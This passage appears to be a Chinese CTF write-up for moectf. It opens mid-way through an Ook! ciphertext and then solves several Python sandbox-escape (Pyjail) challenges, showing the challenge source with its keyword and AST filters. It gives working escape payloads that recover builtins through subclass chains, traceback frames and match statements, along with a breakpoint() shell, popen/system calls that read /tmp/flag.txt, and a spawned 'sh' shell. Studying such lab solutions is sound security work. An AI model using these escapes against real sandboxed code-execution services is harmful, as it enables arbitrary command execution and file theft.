Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. 
```

Ook，来个网址https://wnkit.com/tool/brainfuck-ook-encrypt-decrypt

可得flag

`moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}`



### 沙箱逃逸

#### Pyjail 0

> A simple reader ~~(所以严格来说这题不算 Pyjail)~~
>
> 你可以[使用 netcat](https://ctf.xidian.edu.cn/wiki/13) 或 pwntools（参考二进制漏洞审计入门指北）连接到本题和后续 Pyjail 题的环境。
>
> 关于验证码，示例：Please enter the reverse of 'GZUUAOIS' to continue: SIOAUUZG
>
> 至于 flag 的位置？你可以参考 Web 第十二章（

环境变量：/proc/self/environ

`moectf{69611316-dd9a-c7ca-706b-0493bbd307e6}`



#### Pyjail 1

> flag 位置在 /tmp 下

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    result = eval(user_input)
```

```python
Give me your code: [1].index(__builtins__.__dict__["__imp"+"ort__"]("os").listdir("/tmp"))
Error: ['flag.txt'] is not in list
```

```python
Give me your code: getattr(__builtins__, "__imp"+"ort__")(getattr(__builtins__, "o"+"pen")("/tmp/flag.txt").read())
Error: No module named 'moectf{7d153a1a-a304-2c54-0729-4ca223838ae6}\n'
```

利用报错输出信息

`moectf{7d153a1a-a304-2c54-0729-4ca223838ae6}`



#### Pyjail 2

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    # 过滤特殊字符
    forbidden_chars = ['.', '_', '[', ']', "'", '"']
    for char in forbidden_chars:
        if char in user_input:
            print(f"Forbidden character detected: {char}")
            return

    result = eval(user_input)
```

别说了兄弟们，放大招吧

breakpoint

```python
Give me your code: breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os; os.system('cat /tmp/flag.txt')
moectf{09352f45-de93-914d-44ac-505ef9070266}
0
```

`moectf{09352f45-de93-914d-44ac-505ef9070266}`



#### Pyjail 4

```python
def chall():
    user_input = input("Give me your code: ")
        
    try:
        result = eval(user_input, {"__builtins__": None}, {})
        # Hint: When __builtins__ is None, you need to be more creative...
        print("Code executed successfully!")
        if result is not None:
            print(f"Return value: {result}")
    except Exception as e:
        print(f"Execution error: {type(e).__name__}: {e}")
```

在 Python 的 eval 中，如果内置命名空间被清空，你将无法直接使用基础函数（如 print, __import__, open, getattr 等）。
要绕过这个限制，我们需要利用 Python 的对象继承链（Object Hierarchy），从一个基础对象（如字符串或元组）出发，向上找到 object 类，然后再向下遍历所有已加载的子类，寻找包含危险函数（如 os 模块或 open 函数）的类。
核心思路：利用元类机制找回 builtins
从一个空元组 () 或字符串 "" 开始。
通过 .__class__ 获取其类。
通过 .__base__ 或 .__mro__ 找到 object 基类。
通过 .__subclasses__() 获取当前环境中加载的所有类。
在这些类中找到一个利用点（Gadget），通常是 _wrap_close（包含 os 模块）或 catch_warnings（可以溯回到 builtins）。

```python
Give me your code: [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0].__init__.__globals__['popen']('cat /tmp/flag.txt').read()
Code executed successfully!
Return value: moectf{f90de915-c135-0bda-b78a-8e8ca646a140}
```

`moectf{f90de915-c135-0bda-b78a-8e8ca646a140}`



#### Pyjail 4

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    forbidden_attrs = {
        "__class__", "__dict__", "__bases__", "__mro__", "__subclasses__",
        "__globals__", "__code__", "__closure__", "__func__", "__self__",
        "__module__", "__import__", "__builtins__", "__base__", "__init__", "__getattribute__"
    }
    def visit_Attribute(self, node):
        # 禁止危险属性访问
        if isinstance(node.attr, str) and node.attr in self.forbidden_attrs:
            raise RuntimeError(f"Access to attribute '{node.attr}' is forbidden!")
        self.generic_visit(node)

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        safe_builtins = {
            "print": print,
            "filter": filter,
            "list": list,
            "len": len,
            "Exception": Exception
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

看不懂嗷

```python
try:
 	1/0
except Exception as e:
 	g = e.__traceback__.tb_frame.f_back.f_globals
 	b = g['__builtins__']
 	try:
  	print(b.open('/tmp/flag.txt').read())
 	except:
  	print(b['open']('/tmp/flag.txt').read())
```

```python
Give me your code after base64 encoding it: dHJ5OgogMS8wCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKIGcgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrLmZfZ2xvYmFscwogYiA9IGdbJ19fYnVpbHRpbnNfXyddCiB0cnk6CiAgcHJpbnQoYi5vcGVuKCcvdG1wL2ZsYWcudHh0JykucmVhZCgpKQogZXhjZXB0OgogIHByaW50KGJbJ29wZW4nXSgnL3RtcC9mbGFnLnR4dCcpLnJlYWQoKSk=
```

`moectf{5958096c-603b-1cdf-ff92-4683f988304f}`



#### Pyjail 5

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        # 禁止属性访问
        raise RuntimeError(f"Access to any attributes is forbidden!")

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        # maybe useful
        safe_builtins = {
            "Exception": Exception,
            "object": object,
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

```python
try:
 	1/0
except Exception as e:
 	match e:
  	case object(__traceback__=t):
   	match t:
    case object(tb_frame=f):
     	match f:
      	case object(f_back=b):
       	match b:
        case object(f_globals=g):
         	match g['__builtins__']:
          	case object(open=o):
           	match o('/tmp/flag.txt'):
            case object(read=r):
             	raise Exception(r())
```

```python
Give me your code after base64 encoding it: dHJ5Og0KIDEvMA0KZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KIG1hdGNoIGU6DQogIGNhc2Ugb2JqZWN0KF9fdHJhY2ViYWNrX189dCk6DQogICBtYXRjaCB0Og0KICAgIGNhc2Ugb2JqZWN0KHRiX2ZyYW1lPWYpOg0KICAgICBtYXRjaCBmOg0KICAgICAgY2FzZSBvYmplY3QoZl9iYWNrPWIpOg0KICAgICAgIG1hdGNoIGI6DQogICAgICAgIGNhc2Ugb2JqZWN0KGZfZ2xvYmFscz1nKToNCiAgICAgICAgIG1hdGNoIGdbJ19fYnVpbHRpbnNfXyddOg0KICAgICAgICAgIGNhc2Ugb2JqZWN0KG9wZW49byk6DQogICAgICAgICAgIG1hdGNoIG8oJy90bXAvZmxhZy50eHQnKToNCiAgICAgICAgICAgIGNhc2Ugb2JqZWN0KHJlYWQ9cik6DQogICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKHIoKSk=
```

`moectf{36d28ffd-d713-4d57-e974-5bdbc5ae936f}`



#### Pyjail 6

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        # 禁止属性访问
        raise RuntimeError(f"Access to any attributes is forbidden!")

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        # maybe useful
        safe_builtins = {
            "Exception": Exception,
            "str": str
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

没招了，官wp：

本题的 `__builtins__` 里没有 object 类了，无法用上题的办法，怎么办呢？还有一种办法来访问属性，在[国外博客](https://shirajuki.js.org/blog/pyjail-cheatsheet/)的 `getting attributes` 看见的代码，加点注释放在下面：

```
try:    "{0.__doc__.lol}".format(())    # 尝试格式化传入的第一个参数的 __doc__ 属性的 lol 属性    # 但 lol 属性不存在，因此会引发 AttributeErrorexcept Exception as e:    a = e.obj    print(a) # 拿到 ().__doc__
```

但要实现这个，我们得拿到 format 方法和 obj 方法。你猜怎么着？这两个方法对应的实例所在的类在 `__builtins__` 里都有！结合上题：

```
try:    s = "{0.__doc__.lol}"    match s:        case str(format=val):            val(obj)except Exception as e:    match e:        case Exception(obj=val):            print(val) # 拿到 obj.__doc__
```

然后我们重写，不拿 `obj.__doc__`，而是拿一个访问属性的方法：

```
try:    s = "{0.__class__.__base__.__getattribute__.x}"    match s:        case str(format=val): # type: ignore            val(114514)except Exception as e:    match e:        case Exception(obj=val):            myGetattr = val # 拿到 object 类的 __getattribute__ 函数 # 之后便可以继续栈帧逃逸，或者直接类继承关系逃逸，这里我用继承关系逃逸[myGetattr(myGetattr(x,'__init__'), '__globals__') for x in myGetattr(myGetattr(myGetattr('', '__class__'), '__base__'), '__subclasses__')() if myGetattr(x, '__name__') == '_wrap_close'][0]["system"]("sh") # 也可以不用列表推导式# for x in myGetattr(myGetattr(myGetattr('', '__class__'), '__base__'), '__subclasses__')():#     if myGetattr(x, '__name__') == '_wrap_close':#         globals_dict = myGetattr(myGetattr(x, '__init__'), '__globals__')#         globals_dict['system']('sh')#         break
```

```python
Give me your code after base64 encoding it: dHJ5Og0KICAgIHMgPSAiezAuX19jbGFzc19fLl9fYmFzZV9fLl9fZ2V0YXR0cmlidXRlX18ueH0iDQogICAgbWF0Y2ggczoNCiAgICAgICAgY2FzZSBzdHIoZm9ybWF0PXZhbCk6ICMgdHlwZTogaWdub3JlDQogICAgICAgICAgICB2YWwoMTE0NTE0KQ0KZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgIG1hdGNoIGU6DQogICAgICAgIGNhc2UgRXhjZXB0aW9uKG9iaj12YWwpOg0KICAgICAgICAgICAgbXlHZXRhdHRyID0gdmFsICMg5ou/5YiwIG9iamVjdCDnsbvnmoQgX19nZXRhdHRyaWJ1dGVfXyDlh73mlbANCiANCiMg5LmL5ZCO5L6/5Y+v5Lul57un57ut5qCI5bin6YCD6YC477yM5oiW6ICF55u05o6l57G757un5om/5YWz57O76YCD6YC477yM6L+Z6YeM5oiR55So57un5om/5YWz57O76YCD6YC4DQpbbXlHZXRhdHRyKG15R2V0YXR0cih4LCdfX2luaXRfXycpLCAnX19nbG9iYWxzX18nKSBmb3IgeCBpbiBteUdldGF0dHIobXlHZXRhdHRyKG15R2V0YXR0cignJywgJ19fY2xhc3NfXycpLCAnX19iYXNlX18nKSwgJ19fc3ViY2xhc3Nlc19fJykoKSBpZiBteUdldGF0dHIoeCwgJ19fbmFtZV9fJykgPT0gJ193cmFwX2Nsb3NlJ11bMF1bInN5c3RlbSJdKCJzaCIp
cat /tmp/flag.txt
moectf{4189254d-4d65-3068-b74b-6feff0b61ca6}
```

`moectf{4189254d-4d65-3068-b74b-6feff0b61ca6}`

